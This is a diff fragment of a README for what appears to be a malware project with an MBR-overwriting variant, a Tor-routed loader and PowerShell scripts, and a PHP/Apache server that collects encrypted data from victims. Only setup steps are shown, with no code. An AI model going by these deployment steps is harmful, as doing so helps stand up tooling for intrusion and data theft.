@@ -39,7 +39,6 @@ The clean variant does not overwrite the MBR and does not create a bootloader.
 - Put Init and ONloader in the same folder as tor.exe, start.ps1, images and dlls.(You can find 'tor.exe' in the Tor browser files)
 - Put php files on apache server and modify connection dates
 - Create a database and import tables
-- * Powershell scripts must be enabled
 - Test it on VM
 -To see the data sent to the server, it must be decrypted with the string descriptor
 ##### WARNING!!!Empty spaces in strings must be filled with '+' thus decryption will not work.
